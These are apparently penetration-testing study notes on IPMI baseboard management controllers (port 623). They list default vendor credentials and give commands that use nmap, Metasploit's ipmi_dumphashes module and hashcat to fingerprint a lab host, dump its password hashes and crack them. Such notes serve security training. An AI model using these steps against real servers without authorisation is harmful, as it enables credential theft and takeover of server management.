---
tags: [basics, protocol, ipmi]
---

[[Basics/Index|← Basics]]


- Port 623 
- Systems that are use IPMI are called Baseboard Management Controllers
- Default passwords
	- Dell iDRAC
		- root
		- calvin
	- HP iLO
		- Administrator
		- randomized 8-character string consisting of numbers and uppercase letters
	- Supermicro IPMI 
		- ADMIN
		- ADMIN

### Footprinting 

```bash
sudo nmap -sU --script ipmi-version -p 623 ilo.inlanefreight.local

# Using Metasploit 
use auxiliary/scanner/ipmi/ipmi_version

# Metasploit to dump hashes
use auxiliary/scanner/ipmi/ipmi_dumphashes

# Using hashcat to crack the hashes 
hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u

```

